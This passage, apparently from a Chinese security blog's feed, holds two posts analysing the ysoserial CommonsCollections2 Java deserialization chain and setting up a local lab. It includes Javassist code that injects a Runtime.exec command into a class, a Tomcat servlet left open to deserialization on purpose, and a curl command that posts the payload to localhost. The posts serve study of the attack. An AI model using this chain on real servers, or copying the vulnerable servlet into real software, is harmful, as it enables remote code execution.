    <content type="html"><![CDATA[<h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Mac OS Big Sur</span><br><span class="line">JDK-7u6</span><br><span class="line">commons-collections4-4.0</span><br><span class="line">tomcat8</span><br></pre></td></tr></table></figure><p><code>Ysoserial</code>环境和<code>Web Server</code>环境配置和<a href="http://elssm.top/2021/12/13/Ysoserial%E5%AD%A6%E4%B9%A0/#more" target="_blank" rel="noopener">这里的配置</a>是一样的。</p><h4 id="CC2复现"><a href="#CC2复现" class="headerlink" title="CC2复现"></a>CC2复现</h4><h5 id="Payload生成"><a href="#Payload生成" class="headerlink" title="Payload生成"></a>Payload生成</h5><p><img src="/2021/12/15/Java-CC2链复现与分析/1.png" alt="1"></p><h5 id="Payload测试"><a href="#Payload测试" class="headerlink" title="Payload测试"></a>Payload测试</h5><p><img src="/2021/12/15/Java-CC2链复现与分析/2.png" alt="2"></p><p>复现成功</p><h4 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h4><h5 id="Javassist"><a href="#Javassist" class="headerlink" title="Javassist"></a>Javassist</h5><p>Javassist是用来处理java字节码的类库， java字节码一般存放在后缀名称为class的二进制文件中。每个二进制文件都包含一个java类或者是java接口。对于Javassist有很多知识点，这里我们仅仅说几个payload中用到的一些用法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ClassPool：一个基于哈希表实现的CtClass对象容器，其中键名是类名称，值是表示该类的CtClass对象</span><br><span class="line">  常用方法如下</span><br><span class="line">  getDefault()：单例获取ClassPool，主要用来修改字节码，里面存储基于二进制文件构建的CtClass对象</span><br><span class="line">  get()：根据名称获取CtClass对象</span><br><span class="line">  makeClassInitializer：在当前类中创建一个静态代码块</span><br><span class="line">  insertBefore：在静态代码块的开头插入源代码</span><br><span class="line">CtClass：一个CtClass对象可以处理一个<span class="class"><span class="keyword">class</span>文件，这些<span class="title">CtClass</span>对象可以从<span class="title">ClassPool</span>的一些方法获得。</span></span><br><span class="line"><span class="class">  常用方法如下</span></span><br><span class="line"><span class="class">  <span class="title">writeFile</span>：将生成的类写入文件</span></span><br><span class="line"><span class="class">  <span class="title">toClass</span>：拿到生成的类</span></span><br><span class="line"><span class="class">  <span class="title">newInstance</span>：获取实例对象</span></span><br></pre></td></tr></table></figure><p>举一个例子</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javatest;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javas</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//获取ClassPool实例，主要用来修改字节码，里面存储基于二进制文件构建的CtClass对象</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//通过get方法，获取CtClass对象，将获取到的CtClass对象赋值给cc变量</span></span><br><span class="line">        <span class="comment">//ClassPool中有一张保存CtClass信息的HashTable，在该HashTable中Key为类名，value为类对应的CtClass对象</span></span><br><span class="line">        CtClass cc = pool.get(javas<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="comment">//有了CtClass实例对象，就可以处理类文件，编辑或者修改类</span></span><br><span class="line">        <span class="comment">//因为添加的内容都是完整的java源代码，因此引号要进行转义处理</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a calculator\");"</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializer：在当前类(javas)中创建一个静态代码块</span></span><br><span class="line">        <span class="comment">//insertBefore：在静态代码块的开头插入源代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"Elssm"</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//setName：设置类名，使用System.nanoTime为了不让类名重复</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//writeFile：将生成的类写入文件</span></span><br><span class="line">        cc.writeFile(<span class="string">"/Users/caoyifan/IdeaProjects/WebTest/src/javatest/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上述代码会在指定文件下生成一个新的字节码文件。我们发现，动态生成的类在原有类的基础上添加了静态代码块，如果我们加载这个类的话，静态代码块中的内容就会被执行。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/3.png" alt="3"></p><p>现在我们通过<code>toClass</code>拿到生成的类，并通过<code>newInstance</code>获取实例对象</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> javatest;</span><br><span class="line"><span class="keyword">import</span> javassist.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">javas</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NotFoundException, CannotCompileException, IOException, InstantiationException, IllegalAccessException </span>&#123;</span><br><span class="line">        <span class="comment">//获取ClassPool实例，主要用来修改字节码，里面存储基于二进制文件构建的CtClass对象</span></span><br><span class="line">        ClassPool pool = ClassPool.getDefault();</span><br><span class="line">        <span class="comment">//通过get方法，获取CtClass对象，将获取到的CtClass对象赋值给cc变量</span></span><br><span class="line">        <span class="comment">//ClassPool中有一张保存CtClass信息的HashTable，在该HashTable中Key为类名，value为类对应的CtClass对象</span></span><br><span class="line">        CtClass cc = pool.get(javas<span class="class">.<span class="keyword">class</span>.<span class="title">getName</span>())</span>;</span><br><span class="line">        <span class="comment">//有了CtClass实例对象，就可以处理类文件，编辑或者修改类</span></span><br><span class="line">        <span class="comment">//因为添加的内容都是完整的java源代码，因此引号要进行转义处理</span></span><br><span class="line">        String cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\"open -a calculator\");"</span>;</span><br><span class="line">        <span class="comment">//makeClassInitializer：在当前类(javas)中创建一个静态代码块</span></span><br><span class="line">        <span class="comment">//insertBefore：在静态代码块的开头插入源代码</span></span><br><span class="line">        cc.makeClassInitializer().insertBefore(cmd);</span><br><span class="line">        String randomClassName = <span class="string">"Elssm"</span> + System.nanoTime();</span><br><span class="line">        <span class="comment">//setName：设置类名，使用System.nanoTime为了不让类名重复</span></span><br><span class="line">        cc.setName(randomClassName);</span><br><span class="line">        <span class="comment">//toClass：拿到生成的类</span></span><br><span class="line">        <span class="comment">//newInstance：获取实例对象</span></span><br><span class="line">        cc.toClass().newInstance();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功弹出计算器</p><p><img src="/2021/12/15/Java-CC2链复现与分析/4.png" alt="4"></p><h5 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>PriorityQueue实际上是一个堆（不指定Comparator时默认为最小堆），队列既可以根据元素的自然顺序来排序，也可以根据 Comparator来设置排序规则。队列的头是按指定排序方式的最小元素。如果多个元素都是最小值，则头是其中一个元素。新建对象的时候可以指定一个初始容量，其容量会自动增加。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PriorityQueue优先级队列的函数定义</span><br><span class="line">add() : 在优先级队列的队尾插入元素 , 插入失败则抛出异常.</span><br><span class="line">offer() : 在优先级队列的队尾插入元素 , 插入失败则返回 <span class="keyword">null</span>.</span><br><span class="line">element() : 获取但不删除优先级队列的队首元素 , 获取失败时抛出异常.</span><br><span class="line">peek() : 获取但不删除优先级队列的队首元素 , 获取失败时返回 <span class="keyword">null</span>.</span><br><span class="line">remove : 获取且删除优先级队列的队首元素 , 获取失败时抛出异常.</span><br><span class="line">poll() : 获取且删除优先级队列的队首元素 , 获取失败时返回 <span class="keyword">null</span>.</span><br></pre></td></tr></table></figure><h4 id="Ysoserial-Payload生成分析"><a href="#Ysoserial-Payload生成分析" class="headerlink" title="Ysoserial Payload生成分析"></a>Ysoserial Payload生成分析</h4><h5 id="createTemplatesImpl"><a href="#createTemplatesImpl" class="headerlink" title="createTemplatesImpl"></a>createTemplatesImpl</h5><p>在生成CC2 Payload的时候，首先执行的是<code>Gadgets.createTemplatesImpl(command)</code></p><p><img src="/2021/12/15/Java-CC2链复现与分析/5.png" alt="5"></p><p>在<code>createTemplatesImpl</code>方法中首先会通过<code>getProperty</code>方法获取系统属性<code>properXalan</code>的值，<code>properXalan</code>的默认属性是<code>false</code>，通过调试发现走的是下面的<code>return</code>条件。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/6.png" alt="6"></p><p>跟进发现，首先获取了<code>TemplatesImpl</code>的实例对象。之后通过<code>Javassist</code>动态修改<code>StubTransletPayload</code>类。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/7.png" alt="7"></p><p>接着通过<code>get</code>方法获取<code>abstTranslet</code>类，并通过<code>setSuperclass</code>将该类作为新建类的父类，因为在前面我们获取到了<code>StubTransletPayload</code>类，而<code>StubTransletPayload</code>是继承<code>abstTranslet</code>类的</p><p><img src="/2021/12/15/Java-CC2链复现与分析/8.png" alt="8"></p><p><img src="/2021/12/15/Java-CC2链复现与分析/9.png" alt="9"></p><p>通过上述<code>Javassist</code>操作，就可以将我们写的恶意代码注入到新的字节码文件中中的静态代码块部分</p><p>之后通过<code>CtClass.toBytecode</code>方法获取到恶意类的字节码，并通过java反射机制将字节码填充到<code>TemplatesImpl</code>实例对象的<code>_bytecodes</code>数组中。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/10.png" alt="10"></p><p>之后填充了<code>_name</code>和<code>_tfactory</code>字段，并将<code>TemplatesImpl</code>实例对象返回</p><p><img src="/2021/12/15/Java-CC2链复现与分析/11.png" alt="11"></p><h5 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h5><p>返回<code>TemplatesImpl</code>实例对象之后，接着获取了<code>InvokerTransformer</code>实例对象，并做了一些初始化。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/12.png" alt="12"></p><h5 id="PriorityQueue-1"><a href="#PriorityQueue-1" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h5><p>接着创建一个优先级队列，指定队列的初始容量和比较器。然后填充了两个1来占位初始化。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/13.png" alt="13"></p><p>在优先级队列里，通过<code>TransformingComparator(transformer)</code>获取构造器实例对象，此时的<code>transformer</code>就是上面<code>InvokerTransformer</code>类型的<code>transformer</code>实例对象。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/14.png" alt="14"></p><p>接着优先级队列每次比较的时候，都会调用比较器的<code>compare</code>方法，此时服务端就会调用<code>TransformingComparator.compare</code>方法，进而执行<code>this.transformer.transform</code>方法，这个时候就会执行<code>InvokerTransformer.transform</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/15.png" alt="15"></p><h5 id="setFieldValue"><a href="#setFieldValue" class="headerlink" title="setFieldValue"></a>setFieldValue</h5><p>继续回到CC2 Payload文件中，<code>setFieldValue</code>方法通过反射将<code>iMethodName</code>修改为<code>newTransformer</code></p><p><img src="/2021/12/15/Java-CC2链复现与分析/16.png" alt="16"></p><h5 id="getFieldValue"><a href="#getFieldValue" class="headerlink" title="getFieldValue"></a>getFieldValue</h5><p>接下来获取到优先级队列的实例对象，并修改了其字段值，将我们构造的恶意类注入</p><p><img src="/2021/12/15/Java-CC2链复现与分析/17.png" alt="17"></p><p>修改之后，优先级队列会调用比较器的<code>compare</code>方法去比较<code>templates</code>和1的值，此时会调用执行<code>InvokerTransformer.transform(templates)</code>方法。此时由于<code>templates</code>是<code>TemplatesImpl</code>类型的，因此实际最后会执行<code>TemplatesImpl.newTransformer</code>方法。</p><p>最后<code>Ysoserial</code>返回的优先级队列实例对象如下</p><p><img src="/2021/12/15/Java-CC2链复现与分析/18.png" alt="18"></p><h4 id="CC2-Payload利用原理"><a href="#CC2-Payload利用原理" class="headerlink" title="CC2 Payload利用原理"></a>CC2 Payload利用原理</h4><p>通过<code>Ysoserial</code>分析可以看到Payload返回的是一个<code>PriorityQueue</code>对象。在对<code>Web Server</code>进行调试的时候，我们直接将断点打在<code>PriorityQueue</code>的<code>readObject</code>方法处。</p><p><code>PriorityQueue</code>路径为<code>rt.jar.java.util.PriorityQueue</code></p><h5 id="PriorityQueue-readObject"><a href="#PriorityQueue-readObject" class="headerlink" title="PriorityQueue.readObject"></a>PriorityQueue.readObject</h5><p><img src="/2021/12/15/Java-CC2链复现与分析/19.png" alt="19"></p><p>在<code>readObject</code>方法中，首先通过<code>defaultReadObject</code>方法反序列化数据流。之后通过<code>readInt</code>方法读取优先级队列的长度，接着循环读取数组<code>queue</code>中的内容</p><p><img src="/2021/12/15/Java-CC2链复现与分析/20.png" alt="20"></p><h5 id="PriorityQueue-heapify"><a href="#PriorityQueue-heapify" class="headerlink" title="PriorityQueue.heapify"></a>PriorityQueue.heapify</h5><p>之后调用<code>heapify</code>方法，将无序数组还原成优先级队列。在该方法中会循环找最后一个非叶子结点，然后倒序调用<code>siftDown</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/21.png" alt="21"></p><h5 id="PriorityQueue-siftDown"><a href="#PriorityQueue-siftDown" class="headerlink" title="PriorityQueue.siftDown"></a>PriorityQueue.siftDown</h5><p>在<code>siftDown</code>方法中，会调用<code>siftDownUsingComparator</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/22.png" alt="22"></p><h5 id="PriorityQueue-siftDownUsingComparator"><a href="#PriorityQueue-siftDownUsingComparator" class="headerlink" title="PriorityQueue.siftDownUsingComparator"></a>PriorityQueue.siftDownUsingComparator</h5><p>该方法主要用于形成最小堆</p><p><img src="/2021/12/15/Java-CC2链复现与分析/23.png" alt="23"></p><h5 id="cc4-TransformingComparator"><a href="#cc4-TransformingComparator" class="headerlink" title="cc4.TransformingComparator"></a>cc4.TransformingComparator</h5><p>该方法会获取需要比较的变量。从而执行<code>this.transformer.transform</code>，因为我们已经将<code>this.transformer</code>指向了<code>InvokerTransformer</code>实例对象。因此会执行<code>InvokerTransformer.transform</code>方法，而<code>transform</code>中的参数就是我们传入的恶意类<code>TemplatesImpl</code></p><p><img src="/2021/12/15/Java-CC2链复现与分析/24.png" alt="24"></p><h5 id="InvokerTransformer-transform"><a href="#InvokerTransformer-transform" class="headerlink" title="InvokerTransformer.transform"></a>InvokerTransformer.transform</h5><p>在<code>Ysoserial</code>分析payload生成的时候我们将<code>iMethodName</code>的值改为了<code>newTransformer</code>，因此这里会反射调用<code>TemplatesImpl.newTransformer</code>方法</p><p><img src="/2021/12/15/Java-CC2链复现与分析/25.png" alt="25"></p><h5 id="TemplatesImpl-newTransformer"><a href="#TemplatesImpl-newTransformer" class="headerlink" title="TemplatesImpl.newTransformer"></a>TemplatesImpl.newTransformer</h5><p><code>TemplatesImpl</code>路径为<code>rt.jar.com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl</code></p><p>在构建<code>TemplatesImpl</code>实例对象时，会调用<code>getTransletInstance</code>方法。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/26.png" alt="26"></p><h5 id="TemplatesImpl-getTransletInstance"><a href="#TemplatesImpl-getTransletInstance" class="headerlink" title="TemplatesImpl.getTransletInstance"></a>TemplatesImpl.getTransletInstance</h5><p>在<code>getTransletInstance</code>方法中，首先会判断<code>_name</code>是否为空，如果为空，直接<code>return</code>。接着会判断<code>_class</code>并进入<code>defineTransletClasses</code>方法中</p><p><img src="/2021/12/15/Java-CC2链复现与分析/27.png" alt="27"></p><h5 id="TemplatesImpl-defineTransletClasses"><a href="#TemplatesImpl-defineTransletClasses" class="headerlink" title="TemplatesImpl.defineTransletClasses"></a>TemplatesImpl.defineTransletClasses</h5><p>该方法会对<code>_bytecodes</code>字段进行解析，最后将<code>_transletIndex</code>的值赋为0</p><p><img src="/2021/12/15/Java-CC2链复现与分析/28.png" alt="28"></p><h5 id="newInstance"><a href="#newInstance" class="headerlink" title="newInstance"></a>newInstance</h5><p>此时的<code>_class[_transletIndex]</code>即为<code>_class[0]</code>也就是我们通过啊<code>Ysoserial</code>构造的恶意类，调用<code>newInstance</code>方法后恶意类会被加载然后被实例化，最终执行命令。</p><p><img src="/2021/12/15/Java-CC2链复现与分析/29.png" alt="29"></p><p>完整的利用链如下图所示</p><p><img src="/2021/12/15/Java-CC2链复现与分析/30.png" alt="30"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;复现环境&quot;&gt;&lt;a href=&quot;#复现环境&quot; class=&quot;headerlink&quot; title=&quot;复现环境&quot;&gt;&lt;/a&gt;复现环境&lt;/h4&gt;&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Ysoserial学习</title>
    <link href="elssm.github.io/2021/12/13/Ysoserial%E5%AD%A6%E4%B9%A0/"/>
    <id>elssm.github.io/2021/12/13/Ysoserial学习/</id>
    <published>2021-12-13T04:20:53.000Z</published>
    <updated>2021-12-13T05:19:08.022Z</updated>
    
    <content type="html"><![CDATA[<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>之前没有学习过Java，所以不太了解Java相关漏洞，因此打算通过<code>ysoserial</code>这个工具学习一下，<code>ysoserial</code>集合了各种Java反序列化payload，上手也比较容易。</p><p>github地址：<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial</a></p><h4 id="Ysoserial环境配置"><a href="#Ysoserial环境配置" class="headerlink" title="Ysoserial环境配置"></a>Ysoserial环境配置</h4><p><code>git clone</code>到本地之后通过<code>IDEA</code>打开。因为<code>ysoserial</code>项目是通过<code>Maven</code>搭建的，因此相关依赖也通过<code>Maven</code>下载配置。</p><p>依赖配置完成之后，运行项目的主函数，地址在</p><p><code>ysoserial/src/main/java/ysoserial/GeneratePayload.main()</code></p><p><img src="/2021/12/13/Ysoserial学习/1.png" alt="1"></p><p>我们也可以通过<code>IDEA</code>给<code>ysoserial</code>添加参数，例如通过<code>CommonsCollections1</code>执行弹计算器的命令。</p><p><img src="/2021/12/13/Ysoserial学习/2.png" alt="2"></p><p>执行<code>GeneratePayload.java</code>如下图所示，这样我们就得到了序列化后的字符串。</p><p><img src="/2021/12/13/Ysoserial学习/3.png" alt="3"></p><p>测试的时候我们可以将这段<code>payload</code>发送出去，但是由于是序列化的文件，因此我们需要将序列化后的字符串保存到一个二进制文件中。</p><p>我们知道，在序列化的时候，程序会执行<code>writeObject()</code>方法，因此我们可以在<code>writeObject()</code>之后将数据保存。因此可以定位到如下这段代码</p><p><img src="/2021/12/13/Ysoserial学习/4.png" alt="4"></p><p>在<code>Serializer.serialize()</code>中执行了<code>writeObject()</code>方法</p><p><img src="/2021/12/13/Ysoserial学习/5.png" alt="5"></p><p>因此我们在<code>writeObject()</code>方法后，写入保存序列化文件的代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">            FileOutputStream fout = <span class="keyword">new</span> FileOutputStream(<span class="string">"/YourPath/payload.ser"</span>);</span><br><span class="line">            ObjectOutputStream ot = <span class="keyword">new</span> ObjectOutputStream(fout);</span><br><span class="line">            ot.writeObject(obj);</span><br><span class="line">            ot.close();</span><br><span class="line">            fout.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException fnfe)&#123;</span><br><span class="line">            System.out.println(<span class="string">"payload not found"</span>);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/12/13/Ysoserial学习/6.png" alt="6"></p><p>之后再次运行<code>GeneratePayload.java</code>，则会在指定的路径下生成<code>payload.ser</code>文件</p><p><img src="/2021/12/13/Ysoserial学习/7.png" alt="7"></p><h4 id="WebServer配置"><a href="#WebServer配置" class="headerlink" title="WebServer配置"></a>WebServer配置</h4><h5 id="版本说明"><a href="#版本说明" class="headerlink" title="版本说明"></a>版本说明</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat:8.5.73</span><br><span class="line">jdk:1.7</span><br></pre></td></tr></table></figure><h5 id="Web-xml配置"><a href="#Web-xml配置" class="headerlink" title="Web.xml配置"></a>Web.xml配置</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>demotest.DemoServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>DemoServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/demotest<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure><h5 id="相关包的引入"><a href="#相关包的引入" class="headerlink" title="相关包的引入"></a>相关包的引入</h5><p>在<code>WEB-INF/lib</code>下导入<code>CommonsCollections3.1.jar</code></p><h5 id="Tomcat配置"><a href="#Tomcat配置" class="headerlink" title="Tomcat配置"></a>Tomcat配置</h5><p><img src="/2021/12/13/Ysoserial学习/8.png" alt="8"></p><h5 id="处理请求"><a href="#处理请求" class="headerlink" title="处理请求"></a>处理请求</h5><p>对<code>POST</code>请求的数据执行反序列化操作，处理代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> demotest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintWriter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DemoServlet</span> <span class="keyword">extends</span> <span class="title">javax</span>.<span class="title">servlet</span>.<span class="title">http</span>.<span class="title">HttpServlet</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doPost</span><span class="params">(javax.servlet.http.HttpServletRequest request,javax.servlet.http.HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ServletInputStream sis = request.getInputStream();</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(sis);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ois.readObject();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassNotFoundException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">doGet</span><span class="params">(javax.servlet.http.HttpServletRequest request,javax.servlet.http.HttpServletResponse response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        PrintWriter out = response.getWriter();</span><br><span class="line">        out.println(<span class="string">"This is a demo"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="启动服务"><a href="#启动服务" class="headerlink" title="启动服务"></a>启动服务</h5><p><img src="/2021/12/13/Ysoserial学习/9.png" alt="9"></p><p><img src="/2021/12/13/Ysoserial学习/10.png" alt="10"></p><h4 id="CC1-Payload测试"><a href="#CC1-Payload测试" class="headerlink" title="CC1 Payload测试"></a>CC1 Payload测试</h4><p>使用<code>curl</code>命令向服务器发送post请求，将前面生成的<code>payload.ser</code>发送到服务器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080/demotest --data-binary @/Users/caoyifan/payload.ser</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">--data-binary &lt;data&gt;</span><br><span class="line">  (HTTP) This posts data exactly as specified with no extra processing whatsoever.</span><br><span class="line">  If you start the data with the letter @, the rest should be a filename.  Data is</span><br><span class="line">  posted in a similar manner as --data-ascii does, except that newlines are preserved</span><br><span class="line">  and conversions are never done.</span><br></pre></td></tr></table></figure><p>成功执行弹计算器的命令</p><p><img src="/2021/12/13/Ysoserial学习/11.png" alt="11"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h4&gt;&lt;p&gt;之前没有学习过Java，所以不太了解Java相关漏洞，因此打算通过&lt;code&gt;ysoserial&lt;/code&gt;这个工具学习一下，&lt;code&gt;
      
    
    </summary>
    
    
      <category term="Java" scheme="elssm.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>Java RMI</title>
    <link href="elssm.github.io/2021/12/01/Java-RMI/"/>
    <id>elssm.github.io/2021/12/01/Java-RMI/</id>
    <published>2021-12-01T02:30:24.000Z</published>
    <updated>2021-12-13T09:45:51.497Z</updated>
    
